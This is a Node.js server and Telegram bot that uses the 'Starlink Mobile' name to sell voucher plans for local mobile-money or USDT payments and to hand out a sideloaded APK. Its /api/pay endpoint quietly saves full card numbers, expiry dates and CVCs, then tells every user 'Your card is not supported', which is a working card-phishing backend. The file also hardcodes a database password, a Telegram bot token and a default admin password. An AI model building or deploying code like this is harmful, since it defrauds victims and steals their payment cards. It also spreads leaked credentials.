const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const jwt = require('jsonwebtoken');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://mongo:UTeVLbRgfLqdsrCzCzFUcitqLqPbLuzn@switchyard.proxy.rlwy.net:32968';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8356328415:AAHgDeYLhTDnkKmJxik2YxIHUEwWXeUThDg';
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '8447661042';
const ADMIN_TELEGRAM_URL = process.env.ADMIN_TELEGRAM_URL || 'https://t.me/m/kKMBJpt2NzNl';
const APK_FILE_PATH = path.join(__dirname, 'public', 'Star Link Mobile 2026.001.14.apk');
const IOS_APP_URL = 'https://apps.apple.com/us/app/starlink/id1537177988';
const DESKTOP_APP_URL = 'https://webcatalog.io/en/apps/starlink';

// --- MIDDLEWARE & DB SETUP ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));
mongoose.connect(MONGODB_URI).then(() => console.log('Connected to MongoDB')).catch(err => { console.error('DB connection error:', err); process.exit(1); });

// --- SCHEMAS ---
const voucherSchema = new mongoose.Schema({ code: { type: String, required: true, unique: true, uppercase: true }, is_used: { type: Boolean, default: false }, used_at: Date, created_at: { type: Date, default: Date.now }, plan: String });
const userSchema = new mongoose.Schema({ name: String, email: String, amount: Number, planDuration: String, cardNumber: String, cardExpiry: String, cardCvc: String, country: String, countryName: String, postalCode: String, created_at: { type: Date, default: Date.now } });
const botUserSchema = new mongoose.Schema({ user_id: { type: Number, required: true, unique: true }, first_name: String, last_name: String, username: String, started_at: { type: Date, default: Date.now } });
const paymentSettingsSchema = new mongoose.Schema({
    kpay_name: String, kpay_phone: String, kpay_note: String, kpay_extra_note: String, kpay_qr: String,
    wave_name: String, wave_phone: String, wave_note: String, wave_extra_note: String, wave_qr: String,
    usdt_bep20_address: String, usdt_trc20_address: String, usdt_amount: Number, usdt_extra_note: String, usdt_bep20_qr: String, usdt_trc20_qr: String
});

const Voucher = mongoose.model('Voucher', voucherSchema);
const User = mongoose.model('User', userSchema);
const BotUser = mongoose.model('BotUser', botUserSchema);
const PaymentSettings = mongoose.model('PaymentSettings', paymentSettingsSchema);

// --- TELEGRAM BOT LOGIC ---
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const plans = {
    '1_month': { name: '1 Month', price: 45000, usdt: 15 },
    '3_months': { name: '3 Months', price: 125000, usdt: 40 },
    '6_months': { name: '6 Months', price: 240000, usdt: 75 },
    '12_months': { name: '12 Months', price: 450000, usdt: 140 },
};

const mainMenu = {
    text: "🇲🇲 Starlink Mobile မှကြိုဆိုပါတယ်။\n\nအောက်ပါ Menu မှတဆင့် ဝန်ဆောင်မှုများကို ရွေးချယ်နိုင်ပါပြီ။",
    options: { reply_markup: { inline_keyboard: [[{ text: "App ဒေါင်းလုဒ်ရယူရန်", callback_data: 'download' }], [{ text: "အသုံးပြုပုံလမ်းညွှန်", callback_data: 'guide' }], [{ text: "Voucher ဝယ်ရန်", callback_data: 'buy' }], [{ text: "Admin နဲ့ဆက်သွယ်ရန်", url: ADMIN_TELEGRAM_URL }]] } }
};

bot.onText(/\/start/, async (msg) => {
    const { id, first_name, last_name, username } = msg.from;
    try {
        const existingUser = await BotUser.findOne({ user_id: id });
        if (!existingUser) {
            const newUser = new BotUser({ user_id: id, first_name, last_name, username });
            await newUser.save();
            const fullName = `${first_name || ''} ${last_name || ''}`.trim();
            const userLink = `[${fullName}](tg://user?id=${id})`;
            const date = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Yangon', dateStyle: 'short', timeStyle: 'short' });
            const notificationText = `${userLink} started the bot at ${date}`;
            bot.sendMessage(ADMIN_TELEGRAM_ID, notificationText, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error('Error saving new bot user:', error);
    }
    bot.sendMessage(msg.chat.id, mainMenu.text, mainMenu.options);
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;
    const messageId = msg.message_id;
    const [action, ...params] = data.split('_');

    try {
        switch (action) {
            case 'start':
                await bot.editMessageText(mainMenu.text, { chat_id: chatId, message_id: messageId, ...mainMenu.options });
                break;
            case 'download':
                const downloadOptions = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🤖 Android", callback_data: 'platform_android' }],
                            [{ text: "🍏 iOS", callback_data: 'platform_ios' }],
                            [{ text: "💻 Desktop (Mac/Windows)", callback_data: 'platform_desktop' }],
                            [{ text: '⬅️ Back to Main Menu', callback_data: 'start' }]
                        ]
                    }
                };
                await bot.editMessageText("သင်အသုံးပြုမည့် Platform ကိုရွေးချယ်ပါ။", { chat_id: chatId, message_id: messageId, ...downloadOptions });
                break;
            case 'platform':
                const platform = params[0];
                if (platform === 'android') {
                    await bot.sendChatAction(chatId, 'upload_document');
                    await bot.editMessageText("Starlink Mobile App (Android) ကို ပို့ပေးနေပါသည်၊ ခေတ္တစောင့်ဆိုင်းပေးပါ။\n\nပြီးဆုံးပါက Menu သို့ပြန်သွားရန် /start ကိုနှိပ်ပါ။", { chat_id: chatId, message_id: messageId });
                    await bot.sendDocument(chatId, APK_FILE_PATH).catch(e => console.error('APK Send Error:', e));
                } else if (platform === 'ios') {
                    await bot.editMessageText(`Apple App Store မှ Starlink App ကိုရယူရန် အောက်ပါ Link ကိုနှိပ်ပါ။\n\n${IOS_APP_URL}`, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'download' }]] } });
                } else if (platform === 'desktop') {
                    await bot.editMessageText(`Desktop App (Mac/Windows) ကိုရယူရန် အောက်ပါ Link ကိုနှိပ်ပါ။\n\n${DESKTOP_APP_URL}`, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'download' }]] } });
                }
                break;
            case 'guide':
                const guideText = "**⭐ Starlink Mobile အသုံးပြုရန် အသေးစိတ်လမ်းညွှန် ⭐**\n\n**အဆင့် (၁) - Voucher ဝယ်ယူခြင်း**\n1. ဒီ Telegram Bot မှ 'Voucher ဝယ်ရန်' ခလုတ်ကိုနှိပ်ပါ။\n2. သင်အသုံးပြုလိုသော လစဉ် Package (1 Month, 3 Months, etc.) ကိုရွေးချယ်ပါ။\n3. သင်အဆင်ပြေသော ငွေပေးချေမှုနည်းလမ်း (KBZ Pay, Wave Pay, USDT) ကိုရွေးချယ်ပါ။\n\n---\n\n**အဆင့် (၂) - ငွေပေးချေခြင်း**\n1. Bot မှပြသသော ငွေပေးချေမှုအချက်အလက်များ (KBZ Pay/Wave Pay အကောင့် သို့မဟုတ် USDT လိပ်စာ) သို့ သတ်မှတ်ထားသော ငွေပမာဏကို အတိအကျလွှဲပါ။\n2. ငွေလွှဲပြီးစီးကြောင်း Screenshot ကိုရိုက်ပြီး ဒီ Bot သို့ ချက်ချင်းပြန်ပို့ပါ။\n\n---\n\n**အဆင့် (၃) - Code လက်ခံခြင်း**\n1. သင်၏ ငွေလွှဲ Screenshot ကို Admin မှ စစ်ဆေးပြီး အတည်ပြု (Approve) လုပ်ပေးပါမည်။\n2. အတည်ပြုပြီးပါက Bot မှတစ်ဆင့် သင်၏ လျှို့ဝှက် Voucher Code ကို အလိုအလျောက် ပို့ပေးပါမည်။\n\n---\n\n**အဆင့် (၄) - App ကို Activate လုပ်ခြင်း**\n1. ဒီ Bot မှ 'App ဒေါင်းလုဒ်ရယူရန်' ခလုတ်ကိုနှိပ်ပြီး App ကို Install လုပ်ပါ။\n2. App ကိုဖွင့်ပြီး 'Get Started' ကိုနှိပ်ပါ။\n3. Bot မှရရှိသော Voucher Code ကို Copy ကူးပြီး App ထဲတွင် Paste လုပ်ကာ 'Activate' ကိုနှိပ်ပါ။\n\n---\n\nပြီးပါပြီ။ သင်၏ Starlink Mobile ဝန်ဆောင်မှုကို ယခုအသုံးပြုနိုင်ပါပြီ။";
                await bot.editMessageText(guideText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Back to Main Menu', callback_data: 'start' }]] } });
                break;
            case 'buy':
                const planOptions = Object.keys(plans).map(key => ([{ text: `${plans[key].name} - ${plans[key].price.toLocaleString()} MMK`, callback_data: `plan_${key}` }]));
                await bot.editMessageText("အောက်ပါ Plan များမှ နှစ်သက်ရာတစ်ခုကို ရွေးချယ်ပါ။", { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [...planOptions, [{ text: '⬅️ Back', callback_data: 'start' }]] } });
                break;
            case 'plan':
                const planKey = params.join('_');
                if (!plans[planKey]) return;
                const planText = `သင် ${plans[planKey].name} ကို ရွေးချယ်ထားပါတယ်။ \n\nကျေးဇူးပြု၍ ငွေပေးချေမှုနည်းလမ်းတစ်ခုကို ရွေးချယ်ပါ။`;
                const planKeyboard = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "KBZ Pay", callback_data: `payment_kpay_${planKey}` }],
                            [{ text: "Wave Pay", callback_data: `payment_wave_${planKey}` }],
                            [{ text: "USDT (BEP20)", callback_data: `payment_usdt-bep20_${planKey}` }],
                            [{ text: "USDT (TRC20)", callback_data: `payment_usdt-trc20_${planKey}` }],
                            [{ text: '⬅️ Back', callback_data: 'buy' }]
                        ]
                    }
                };
                try {
                    await bot.editMessageText(planText, { chat_id: chatId, message_id: messageId, ...planKeyboard });
                } catch (error) {
                    if (error.code === 'ETELEGRAM' && error.message.includes('there is no text in the message to edit')) {
                        await bot.deleteMessage(chatId, messageId);
                        await bot.sendMessage(chatId, planText, planKeyboard);
                    } else {
                        throw error;
                    }
                }
                break;
            case 'payment':
                const [paymentMethod, ...pKeyParts] = params;
                const paymentPlanKey = pKeyParts.join('_');
                const settings = await PaymentSettings.findOne();
                if (!settings) throw new Error('Payment settings not configured.');
                let paymentDetails = '';
                let qrImagePath = '';

                if (paymentMethod === 'kpay') {
                    paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ KBZ Pay အကောင့်သို့ *${plans[paymentPlanKey].price.toLocaleString()} MMK* လွှဲပေးပါ။\n\nName: \`${settings.kpay_name}\`\nPhone: \`${settings.kpay_phone}\`\nNote: \`${settings.kpay_note}\`\n\nငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...`;
                    qrImagePath = settings.kpay_qr;
                } else if (paymentMethod === 'wave') {
                    paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ Wave Pay အကောင့်သို့ *${plans[paymentPlanKey].price.toLocaleString()} MMK* လွှဲပေးပါ။\n\nName: \`${settings.wave_name}\`\nPhone: \`${settings.wave_phone}\`\nNote: \`${settings.wave_note}\`\n\nငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...`;
                    qrImagePath = settings.wave_qr;
                } else {
                    const network = paymentMethod.split('-')[1].toUpperCase();
                    const address = network === 'BEP20' ? settings.usdt_bep20_address : settings.usdt_trc20_address;
                    paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ USDT (${network}) လိပ်စာသို့ *${plans[paymentPlanKey].usdt} USDT* လွှဲပေးပါ။\n\nAddress:\n\`${address}\`\n\nငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။\nငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...`;
                    qrImagePath = network === 'BEP20' ? settings.usdt_bep20_qr : settings.usdt_trc20_qr;
                }

                if (qrImagePath) {
                    try {
                        await bot.sendPhoto(chatId, path.join(__dirname, 'public', qrImagePath), {
                            caption: paymentDetails,
                            parse_mode: 'Markdown',
                            reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: `plan_${paymentPlanKey}` }]] }
                        });
                        await bot.deleteMessage(chatId, messageId);
                    } catch (e) { 
                        console.error('QR Send Error:', e); 
                        await bot.editMessageText(paymentDetails, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: `plan_${paymentPlanKey}` }]] } });
                    }
                } else {
                    await bot.editMessageText(paymentDetails, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Back', callback_data: `plan_${paymentPlanKey}` }]] } });
                }

                bot.once('photo', (photoMsg) => handleScreenshot(photoMsg, paymentPlanKey));
                break;
            case 'approve':
                const [userId, userChatId, ...approvedPlanParams] = params;
                const approvedPlanKey = approvedPlanParams.join('_');
                const code = await generateVoucherCode(approvedPlanKey);
                await bot.sendMessage(userChatId, `✅ သင်၏ ${plans[approvedPlanKey].name} အတွက် Voucher Code ရပါပြီ။`);
                await bot.sendMessage(userChatId, `\`${code}\``, { parse_mode: 'Markdown' });
                await bot.editMessageText(`✅ Approved for ${userId}. Voucher sent.`, { chat_id: msg.chat.id, message_id: msg.message_id });
                break;
            case 'reject':
                const [rejectedUserId, rejectedUserChatId] = params;
                bot.sendMessage(rejectedUserChatId, "❌ သင်၏ ငွေပေးချေမှုကို ငြင်းပယ်လိုက်ပါသည်။ အကြောင်းအရာများသိရှိလိုပါက Admin ကိုဆက်သွယ်ပါ။");
                await bot.editMessageText(`❌ Rejected for ${rejectedUserId}.`, { chat_id: msg.chat.id, message_id: msg.message_id });
                break;
        }
    } catch (error) {
        if (error.code !== 'ETELEGRAM' || !error.message.includes('message is not modified')) {
             console.error('Callback Query Error:', error);
        }
    }
});


async function handleScreenshot(msg, planKey) {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userFullName = `${msg.from.first_name} ${msg.from.last_name || ''}`.trim();
    const caption = `New Payment Screenshot for ${plans[planKey].name} from user ${userFullName} (ID: ${userId}).`;
    await bot.forwardMessage(ADMIN_TELEGRAM_ID, chatId, msg.message_id);
    await bot.sendMessage(ADMIN_TELEGRAM_ID, caption, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Approve", callback_data: `approve_${userId}_${chatId}_${planKey}` }, { text: "Reject", callback_data: `reject_${userId}_${chatId}` }]
            ]
        }
    });
    bot.sendMessage(chatId, "သင်၏ ငွေပေးချေမှုကို လက်ခံရရှိပါသည်။ Admin မှစစ်ဆေးပြီး အတည်ပြုပေးပါမည်။ ခေတ္တခဏစောင့်ဆိုင်းပေးပါ။");
}

async function generateVoucherCode(plan) {
    const code = 'STAR-' + Math.random().toString(36).substring(2, 10).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
    try {
        const voucher = new Voucher({ code, plan });
        await voucher.save();
        return code;
    } catch (err) {
        if (err.code === 11000) return generateVoucherCode(plan);
        throw err;
    }
}

function authMiddleware(req, res, next) {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ success: false, message: 'Unauthorized: No token provided' });
    }
    const token = authHeader.substring(7);
    try { jwt.verify(token, JWT_SECRET); next(); } catch (err) { return res.status(401).json({ success: false, message: 'Unauthorized: Invalid token' }); }
}

app.post('/api/auth/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '12h' });
        return res.json({ success: true, token, admin_url: ADMIN_TELEGRAM_URL });
    }
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
});

app.get('/api/bot-users', authMiddleware, async (req, res) => {
    try { res.json({ success: true, users: await BotUser.find().sort({ started_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});

app.delete('/api/bot-users/clear', authMiddleware, async (req, res) => {
    try { await BotUser.deleteMany({}); res.json({ success: true, message: 'All bot users cleared.' }); } catch(e) { res.status(500).json({ success: false }); }
});

app.post('/api/vouchers/validate', async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) return res.status(400).json({ success: false, message: 'Voucher code is required' });
    const voucher = await Voucher.findOne({ code: code.toUpperCase() });
    if (!voucher) return res.json({ success: false, valid: false, message: 'Invalid voucher code' });
    if (voucher.is_used) return res.json({ success: true, valid: true, used: true, message: 'Voucher code already used' });
    voucher.is_used = true;
    voucher.used_at = new Date();
    await voucher.save();
    res.json({ success: true, valid: true, used: false, message: 'Voucher code activated successfully' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

app.post('/api/pay', async (req, res) => {
  try {
    const user = new User(req.body);
    await user.save();
    res.json({ success: false, message: 'Your card is not supported' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error processing payment' });
  }
});

app.post('/api/vouchers/generate', authMiddleware, async (req, res) => {
  try {
    const count = req.body.count || 1;
    for (let i = 0; i < count; i++) {
        await new Voucher({ code: generateVoucherCode() }).save();
    }
    res.json({ success: true, message: `${count} vouchers generated.` });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error generating vouchers' });
  }
});

app.get('/api/payment-settings', authMiddleware, async (req, res) => {
    try {
        let settings = await PaymentSettings.findOne();
        if (!settings) {
            settings = await new PaymentSettings({
                kpay_name: 'Testing', kpay_phone: '09123456789', kpay_note: 'Payment', kpay_qr: 'kpayqr.jpg',
                wave_name: 'Testing', wave_phone: '09123456789', wave_note: 'Payment', wave_qr: 'waveqr.jpg',
                usdt_amount: 12, usdt_bep20_address: 'demo-bep20-address', usdt_trc20_address: 'demo-trc20-address',
                usdt_bep20_qr: 'usdtbep20.jpg', usdt_trc20_qr: 'usdttrc20.jpg'
            }).save();
        }
        res.json({ success: true, settings, admin_url: ADMIN_TELEGRAM_URL });
    } catch (e) { res.status(500).json({ success: false }); }
});

app.post('/api/payment-settings', authMiddleware, async (req, res) => {
    try {
        const settings = await PaymentSettings.findOneAndUpdate({}, req.body, { new: true, upsert: true });
        res.json({ success: true, settings });
    } catch (e) { res.status(500).json({ success: false }); }
});

app.get('/api/vouchers', authMiddleware, async (req, res) => {
    try { res.json({ success: true, vouchers: await Voucher.find().sort({ created_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});

app.delete('/api/vouchers/:id', authMiddleware, async (req, res) => {
    try { await Voucher.findByIdAndDelete(req.params.id); res.json({ success: true, message: 'Voucher deleted.' }); } catch(e) { res.status(500).json({ success: false }); }
});

app.delete('/api/vouchers/clear', authMiddleware, async (req, res) => {
    try { await Voucher.deleteMany({}); res.json({ success: true, message: 'All vouchers cleared.' }); } catch(e) { res.status(500).json({ success: false }); }
});

app.get('/api/users', authMiddleware, async (req, res) => {
    try { res.json({ success: true, users: await User.find().sort({ created_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
});

app.delete('/api/users/:id', authMiddleware, async (req, res) => {
    try { await User.findByIdAndDelete(req.params.id); res.json({ success: true, message: 'Payment deleted.' }); } catch(e) { res.status(500).json({ success: false }); }
});

app.delete('/api/users/clear', authMiddleware, async (req, res) => {
    try { await User.deleteMany({}); res.json({ success: true, message: 'All payments cleared.' }); } catch(e) { res.status(500).json({ success: false }); }
});

app.get('/api/vouchers/stats', authMiddleware, async (req, res) => {
    try { const total = await Voucher.countDocuments(); const used = await Voucher.countDocuments({ is_used: true }); res.json({ success: true, total, used, available: total - used }); } catch (e) { res.status(500).json({ success: false }); }
});

app.get('/*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));